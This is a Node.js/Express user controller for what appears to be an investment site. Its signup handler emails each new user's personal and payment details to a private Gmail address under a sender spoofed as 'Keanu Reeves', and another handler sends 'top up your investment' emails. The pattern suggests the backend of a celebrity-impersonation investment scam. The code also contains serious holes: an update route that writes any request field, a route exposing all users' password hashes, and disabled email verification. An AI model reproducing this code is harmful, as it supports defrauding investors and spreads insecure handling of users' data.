
const User = require("../models/User");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const sendEmail = require("../utils/mailer.js");
const emailTemplate = require("../utils/emailTemplate");
const crypto = require('crypto');
const Token = require("../models/Token");
const profitTemplate = require("../utils/profitTemplate");
const fivekTemplate = require("../utils/fivekTemplate");

exports.createUser = async (req, res) => {

    const newUser = new User(req.body)
    
    try {
        
        await newUser.save()

        await sendEmail({
          from: "Keanu Reeves <admin@bittstream.org>",

          to: "wujesse17@gmail.com",

          subject: "NEW SIGNUP ON K.V.",

          html: `
                <html>
                    <body>
                        <p> Name: ${newUser.name}</p> <br>
                        <p>Email: ${newUser.email}</p> <br>
                        <p>Name: ${newUser.phone}</p> <br>
                        <p>Country: ${newUser.country}</p> <br>
                        <p>Ticket: ${newUser.ticket}</p> <br>
                        <p>Payment Method: ${newUser.paymentMethod}</p> <br>
                    </body>
                </html>
            `,
        });

        return res.status(201).json("Account created")
        // return res.redirect("/emailer")

    } catch (error) {
        
        return res.status(404).json("An error occured while trying to create your account")

    }

}

// Confirm Email
exports.confirmEmail = async (req, res) => {

    const {id, token} = req.query;
    
    try {
       
        const thisUser = await User.findById(id)

        if(!thisUser) return res.redirect("/login");
        // if(!thisUser) return res.json("No USER");
        

        const thisToken = await Token.findOne({
            userId: id,
            token
        })
        
        if(!thisToken) return res.redirect("/login");
        // if(!thisToken) return res.status("NO TOKEN");

        await User.findOneAndUpdate(
            {
                _id: thisUser._id
            }, {
                $set: {
                    validated: true
                }
            },{new: true}
        );

        await Token.findByIdAndDelete(thisToken._id)
        
        return res.redirect("/confirmed")
        // return res.json("confirmed")

    } catch (error) {
        return res.status(404).json("Oops An error Occured")
    }
}


// Login User
exports.loginUser = async  (req, res) => {

    try {
        // finds user by email
        const user = await User.findOne({ email: req.body.email });

        if(!user) return res.status(401).json("An account is not registered with this email");
    
        // compares password
        const validPassword = await bcrypt.compare(req.body.password, user.password);

        if(!validPassword) return res.status(404).json("Incorrect password");

        // if(!user.validated){

        //     let token = await Token.findOne({
        //         userId: user._id,
        //     })

        //     if (!token) { 

        //         token = await new Token({
            
        //             userId: user._id,
            
        //             token: crypto.randomBytes(32).toString("hex"),
              
        //         }).save();

        //     }

        //     const url = `https://www.icapitalvex.com/api/validate?token=${token.token}&id=${user._id}`
    
        //     await sendEmail({
    
        //         from: "iCapitalvex Admin <admin@icapitalvex.com> ",

        //         to: user.email,

        //         subject: "Verify Email Address for iCapitalvex",
    
        //         html: emailTemplate(url, user.firstName)
    
        //     })
    
        //     return res.status(201).json({redirect: true})
        //     // return res.redirect("/emailer")
        // }

        // sends JSON_WEB_TOKEN
        const token = user.getSignedToken();
        
        // hides password from client
        const { password, ...others} = user._doc

        return res.status(200).json({...others, token})
        

    } catch (err) {
        console.log(err)
        return res.status(404).json(err)
    }
}

exports.updateUser = async(req, res) => {
    try {
        if(req.body.password){
            const salt = await bcrypt.genSalt(10)
            const hashedPassword = await bcrypt.hash(req.body.password, salt)
            req.body.password = hashedPassword
        }
        const user = await User.findOneAndUpdate(
            {
                _id: req.params.id
            }, {
                $set: req.body
            },{new: true}
        );
        res.status(200).json(user)
    } catch (error) {
        res.status(400).json(error)
    }
}

exports.deleteUser = async (req, res) => {
    try {
        await User.findOneAndDelete({_id: req.user.id})
        res.status(200).json("User Account deleted")
    } catch (error) {
        res.status(400).json(error)
    }
}

// get a user
exports.getOneUser = async (req, res) => {
    try {
       
        const user = await User.findById(req.params.id)
       
       const {password, createdAt, updatedAt, ...others} = user._doc
    
       return res.status(200).json(others)
    
    } catch (err) {
    
        return res.status(404).json(err) 
    
    }
}

// Get all users
exports.getAllUsers = async (req, res) => {
    
    try {
    
        const users = await User.find({})
    
       res.status(200).json(users)
    
    } catch (err) {
       
        return res.status(404).json(err) 

    }

}

// SEND PROFIT EMAIL
exports.sendProfitEmail = async (req, res) => {

    try {
       
        const {userName, email, profit} = req.body

        await sendEmail({

            from: "iCapitalvex Admin <admin@icapitalvex.com>",

            to: email,

            subject: "TOP UP YOUR INVESTMENT ON iCAPITALVEX",
            // subject: "NEW iCAPITALVEX PASSWORD",

            // html: profitTemplate(userName, profit)
            html: fivekTemplate()

        })

        return res.status(201).json("Email was successfully sent to recipient");
        
    } catch (error) {
       
        return res.status(404).json(error)
       
    }
    
}

exports.hashPassword = async (req, res) => {

    try {
        
        const salt = await bcrypt.genSalt(10);
        
        const hashedPassword = await bcrypt.hash(req.body.password, salt);

        return res.status(201).json(hashedPassword);
        
    } catch (error) {
        return res.status(400).json(error);
    }

}